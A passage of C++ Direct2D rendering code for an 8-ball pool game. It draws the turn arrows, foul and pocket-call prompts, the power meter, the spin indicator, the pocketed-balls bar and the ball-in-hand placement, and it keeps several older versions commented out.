                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player2Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }

        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            D2D1_RECT_F playerBox = (currentPlayer == 1) ? p1Rect : p2Rect;
            arrowBackX = playerBox.left - 25.0f;
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f;

            float notchDepth = 12.0f;  // Increased from 6.0f to make the rectangle longer
            float notchWidth = 10.0f;

            float cx = arrowBackX;
            float cy = arrowCenterY;

            // Define triangle + rectangle tail shape
            D2D1_POINT_2F tip = D2D1::Point2F(arrowTipX, cy);                           // tip
            D2D1_POINT_2F baseTop = D2D1::Point2F(cx, cy - arrowSizeBase / 2.0f);          // triangle top
            D2D1_POINT_2F baseBot = D2D1::Point2F(cx, cy + arrowSizeBase / 2.0f);          // triangle bottom

            // Rectangle coordinates for the tail portion:
            D2D1_POINT_2F r1 = D2D1::Point2F(cx - notchDepth, cy - notchWidth / 2.0f);   // rect top-left
            D2D1_POINT_2F r2 = D2D1::Point2F(cx, cy - notchWidth / 2.0f);                 // rect top-right
            D2D1_POINT_2F r3 = D2D1::Point2F(cx, cy + notchWidth / 2.0f);                 // rect bottom-right
            D2D1_POINT_2F r4 = D2D1::Point2F(cx - notchDepth, cy + notchWidth / 2.0f);    // rect bottom-left

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(baseTop);
                    pSink->AddLine(r2); // transition from triangle into rectangle
                    pSink->AddLine(r1);
                    pSink->AddLine(r4);
                    pSink->AddLine(r3);
                    pSink->AddLine(baseBot);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }


            SafeRelease(&pArrowBrush);
        }

        //original
    /*
        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            if (currentPlayer == 1) {
    arrowBackX = p1Rect.left - 25.0f; // Position left of the box
                arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
                // Define points for right-pointing arrow
                //D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
                //D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
                //D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back
                // Enhanced arrow with base rectangle intersection
        float notchDepth = 6.0f; // Depth of square base ""stem""
        float notchWidth = 4.0f; // Thickness of square part

        D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
        D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
        D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY - notchWidth / 2.0f); // Square Left-Top
        D2D1_POINT_2F pt4 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY + notchWidth / 2.0f); // Square Left-Bottom
        D2D1_POINT_2F pt5 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back


        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(pt2);
                pSink->AddLine(pt3);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
            }


            //==================else player 2
            else { // Player 2
             // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
             // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    arrowBackX = p2Rect.left - 25.0f; // Position left of the box
    arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
    // Define points for right-pointing arrow
    D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
    D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
    D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

    ID2D1PathGeometry* pPath = nullptr;
    if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
        ID2D1GeometrySink* pSink = nullptr;
        if (SUCCEEDED(pPath->Open(&pSink))) {
            pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
            pSink->AddLine(pt2);
            pSink->AddLine(pt3);
            pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
            pSink->Close();
            SafeRelease(&pSink);
            pRT->FillGeometry(pPath, pArrowBrush);
        }
        SafeRelease(&pPath);
    }
            }
            */


            // --- Persistent Blue 8?Ball Call Arrow & Prompt ---
        /*if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
        {
            // determine index (default top?right)
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
        }*/

        // --- Persistent Blue 8?Ball Pocket Arrow & Prompt (once called) ---
    /* if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
    {
        // 1) Determine pocket index
        int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
        // If the other player had called but it's now your turn, still show that call
        if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
        if (idx < 0) idx = 2; // default to top?right if somehow still unset

        // 2) Draw large blue arrow
        ID2D1SolidColorBrush* pArrow = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
        if (pArrow) {
            auto P = pocketPositions[idx];
            D2D1_POINT_2F tri[3] = {
                { P.x - 15.0f, P.y - 40.0f },
                { P.x + 15.0f, P.y - 40.0f },
                { P.x       , P.y - 10.0f }
            };
            ID2D1PathGeometry* geom = nullptr;
            pFactory->CreatePathGeometry(&geom);
            ID2D1GeometrySink* sink = nullptr;
            geom->Open(&sink);
            sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
            sink->AddLines(&tri[1], 2);
            sink->EndFigure(D2D1_FIGURE_END_CLOSED);
            sink->Close();
            pRT->FillGeometry(geom, pArrow);
            SafeRelease(&sink);
            SafeRelease(&geom);
            SafeRelease(&pArrow);
        }

        // 3) Draw persistent prompt text
        D2D1_RECT_F txt = D2D1::RectF(
            TABLE_LEFT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
            TABLE_RIGHT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
        );
        pRT->DrawText(
            L""Choose a pocket..."",
            (UINT32)wcslen(L""Choose a pocket...""),
            pTextFormat,
            &txt,
            pBrush
        );
        // Note: no 'return'; allow foul/turn text to draw beneath if needed
    } */

    // new code ends here

        // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
        if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
            ID2D1SolidColorBrush* pFoulBrush = nullptr;
            pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
            if (pFoulBrush && pLargeTextFormat) {
                // Calculate Rect for bottom-middle area
                float foulWidth = 200.0f; // Adjust width as needed
                float foulHeight = 60.0f;
                float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
                // Position below the pocketed balls bar
                float foulTop = pocketedBallsBarRect.bottom + 10.0f;
                D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

                // --- Set text alignment to center for foul text ---
                pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

                // --- Restore default alignment for large text if needed elsewhere ---
                // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                SafeRelease(&pFoulBrush);
            }
        }

        // --- Blue Arrow & Prompt for 8?Ball Call (while choosing or after called) ---
        if ((currentGameState == CHOOSING_POCKET_P1
            || currentGameState == CHOOSING_POCKET_P2)
            || (calledPocketP1 >= 0 || calledPocketP2 >= 0))
        {
            // determine index:
            //  - if a call exists, use it
            //  - if still choosing, use hover if any
            // determine index: use only the clicked call; default to top?right if unset
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt below pockets
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
            // do NOT return here; allow foul/turn text to display under the arrow
        }

        // Removed Obsolete
        /*
        // --- 8-Ball Pocket Selection Arrow & Prompt ---
        if (currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2) {
            // Determine which pocket to highlight (default to Top-Right if unset)
            int idx = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
            if (idx < 0) idx = 2;

            // Draw the downward arrow
            ID2D1SolidColorBrush* pArrowBrush = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
            if (pArrowBrush) {
                D2D1_POINT_2F P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 10.0f, P.y - 30.0f},
                    {P.x + 10.0f, P.y - 30.0f},
                    {P.x        , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrowBrush);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrowBrush);
            }

            // Draw “Choose a pocket...” text under the table
            D2D1_RECT_F prompt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &prompt,
                pBrush
            );

            return; // Skip normal turn/foul text
        }
        */


        // Show AI Thinking State (Unchanged from previous step)
        if (currentGameState == AI_THINKING && pTextFormat) {
            ID2D1SolidColorBrush* pThinkingBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
            if (pThinkingBrush) {
                D2D1_RECT_F thinkingRect = p2Rect;
                thinkingRect.top += 20; // Offset within P2 box
                // Ensure default text alignment for this
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
                pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
                SafeRelease(&pThinkingBrush);
            }
        }

        SafeRelease(&pBrush);

        // --- Draw CHEAT MODE label if active ---
        if (cheatModeEnabled) {
            ID2D1SolidColorBrush* pCheatBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
            if (pCheatBrush && pTextFormat) {
                D2D1_RECT_F cheatTextRect = D2D1::RectF(
                    TABLE_LEFT + 10.0f,
                    TABLE_TOP + 10.0f,
                    TABLE_LEFT + 200.0f,
                    TABLE_TOP + 40.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
            }
            SafeRelease(&pCheatBrush);
        }
    }

    void DrawPowerMeter(ID2D1RenderTarget* pRT) {
        // Draw Border
        ID2D1SolidColorBrush* pBorderBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
        if (!pBorderBrush) return;
        pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
        SafeRelease(&pBorderBrush);

        // Create Gradient Fill
        ID2D1GradientStopCollection* pGradientStops = nullptr;
        ID2D1LinearGradientBrush* pGradientBrush = nullptr;
        D2D1_GRADIENT_STOP gradientStops[4];
        gradientStops[0].position = 0.0f;
        gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
        gradientStops[1].position = 0.45f;
        gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
        gradientStops[2].position = 0.7f;
        gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
        gradientStops[3].position = 1.0f;
        gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

        pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
        if (pGradientStops) {
            D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
            props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
            props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
            pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
            SafeRelease(&pGradientStops);
        }

        // Calculate Fill Height
        float fillRatio = 0;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Determine if power meter should reflect shot power (human aiming or AI preparing)
        bool humanIsAimingPower = isAiming && (currentGameState == AIMING || currentGameState == BREAKING);
        // NEW Condition: AI is displaying its aim, so show its chosen power
        bool aiIsVisualizingPower = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (humanIsAimingPower || aiIsVisualizingPower) { // Use the new condition
            fillRatio = shotPower / MAX_SHOT_POWER;
        }
        float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
        D2D1_RECT_F fillRect = D2D1::RectF(
            powerMeterRect.left,
            powerMeterRect.bottom - fillHeight,
            powerMeterRect.right,
            powerMeterRect.bottom
        );

        if (pGradientBrush) {
            pRT->FillRectangle(&fillRect, pGradientBrush);
            SafeRelease(&pGradientBrush);
        }

        // Draw scale notches
        ID2D1SolidColorBrush* pNotchBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
        if (pNotchBrush) {
            for (int i = 0; i <= 8; ++i) {
                float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
                pRT->DrawLine(
                    D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                    D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                    pNotchBrush,
                    1.5f
                );
            }
            SafeRelease(&pNotchBrush);
        }

        // Draw ""Power"" Label Below Meter
        if (pTextFormat) {
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
            if (pTextBrush) {
                D2D1_RECT_F textRect = D2D1::RectF(
                    powerMeterRect.left - 20.0f,
                    powerMeterRect.bottom + 8.0f,
                    powerMeterRect.right + 20.0f,
                    powerMeterRect.bottom + 38.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
                SafeRelease(&pTextBrush);
            }
        }

        // Draw Glow Effect if fully charged or fading out
        static float glowPulse = 0.0f;
        static bool glowIncreasing = true;
        static float glowFadeOut = 0.0f; // NEW: tracks fading out

        if (shotPower >= MAX_SHOT_POWER * 0.99f) {
            // While fully charged, keep pulsing normally
            if (glowIncreasing) {
                glowPulse += 0.02f;
                if (glowPulse >= 1.0f) glowIncreasing = false;
            }
            else {
                glowPulse -= 0.02f;
                if (glowPulse <= 0.0f) glowIncreasing = true;
            }
            glowFadeOut = 1.0f; // Reset fade out to full
        }
        else if (glowFadeOut > 0.0f) {
            // If shot fired, gradually fade out
            glowFadeOut -= 0.02f;
            if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
        }

        if (glowFadeOut > 0.0f) {
            ID2D1SolidColorBrush* pGlowBrush = nullptr;
            float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
            pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
                &pGlowBrush
            );
            if (pGlowBrush) {
                float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
                float glowCenterY = powerMeterRect.top;
                D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                    D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                    12.0f + 3.0f * glowPulse,
                    6.0f + 2.0f * glowPulse
                );
                pRT->FillEllipse(&glowEllipse, pGlowBrush);
                SafeRelease(&pGlowBrush);
            }
        }
    }

    void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pWhiteBrush = nullptr;
        ID2D1SolidColorBrush* pRedBrush = nullptr;

        pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
        pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

        if (!pWhiteBrush || !pRedBrush) {
            SafeRelease(&pWhiteBrush);
            SafeRelease(&pRedBrush);
            return;
        }

        // Draw White Ball Background
        D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
        pRT->FillEllipse(&bgEllipse, pWhiteBrush);
        pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


        // Draw Red Dot for Spin Position
        float dotRadius = 4.0f;
        float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
        float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
        D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
        pRT->FillEllipse(&dotEllipse, pRedBrush);

        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
    }


    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBgBrush = nullptr;
        ID2D1SolidColorBrush* pBallBrush = nullptr;

        // Ensure render target is valid before proceeding
        if (!pRT) return;

        HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
        if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
        if (FAILED(hr)) {
            SafeRelease(&pBgBrush);
            SafeRelease(&pBallBrush);
            return; // Exit if brush creation fails
        }

        // Draw the background bar (rounded rect)
        D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
        float baseAlpha = 0.8f;
        float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
        float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
        pBgBrush->SetOpacity(finalAlpha);
        pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
        pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

        // --- Draw small circles for pocketed balls inside the bar ---

        // Calculate dimensions based on the bar's height for better scaling
        float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
        float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
        float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
        float padding = spacing * 0.75f; // Add padding from the edges
        float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

        // Starting X positions with padding
        float currentX_P1 = pocketedBallsBarRect.left + padding;
        float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

        int p1DrawnCount = 0;
        int p2DrawnCount = 0;
        const int maxBallsToShow = 7; // Max balls per player in the bar

        for (const auto& b : balls) {
            if (b.isPocketed) {
                // Skip cue ball and 8-ball in this indicator
                if (b.id == 0 || b.id == 8) continue;

                bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
                bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

                if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P1 balls from left to right
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p1DrawnCount++;
                }
                else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P2 balls from right to left
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p2DrawnCount++;
                }
                // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
                // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
            }
        }

        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
    }

    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
        if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
            return; // Only show when placing/dragging
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

        if (pGhostBrush) {
            D2D1_POINT_2F drawPos;
            if (isDraggingCueBall) {
                drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
            }
            else {
                // If not dragging but in placement state, show at current ball pos
                drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
            }

            // Check if the placement is valid before drawing differently?
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

            if (!isValid) {
                // Maybe draw red outline if invalid placement?
                pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
            }


            D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
            pRT->FillEllipse(&ghostEllipse, pGhostBrush);
            pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

            SafeRelease(&pGhostBrush);
        }
    }

    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT) {
        /*  Never show the arrow while the player is still placing the
        cue-ball (ball-in-hand) – it otherwise hides behind the
        ghost-ball and can lock the UI.                               */

        /* Still skip the opening-break placement,
       but show the arrow during BALL-IN-HAND */
       // ? skip when no active call for the CURRENT shooter
        if ((currentPlayer == 1 && calledPocketP1 < 0) ||
            (currentPlayer == 2 && calledPocketP2 < 0))    return;
        /*if (currentGameState == PRE_BREAK_PLACEMENT)
            return;*/ //new ai-asked-to-disable
            /*if (currentGameState == BALL_IN_HAND_P1 ||
                currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT)
            {
                return;
            }*/

        int pocketToIndicate = -1;
        // Whenever EITHER player has pocketed their first 7 and has called (human or AI),
        // we forcibly show their arrow—regardless of currentGameState.
        if ((currentPlayer == 1 && player1Info.ballsPocketedCount >= 7 && calledPocketP1 >= 0) ||
            (currentPlayer == 2 && player2Info.ballsPocketedCount >= 7 && calledPocketP2 >= 0))
        {
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        /*// A human player is actively choosing if they are in the CHOOSING_POCKET state.
        bool isHumanChoosing = (currentGameState == CHOOSING_POCKET_P1 || (currentGameState == CHOOSING_POCKET_P2 && !isPlayer2AI));

        if (isHumanChoosing) {
            // When choosing, show the currently selected pocket (which has a default).
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
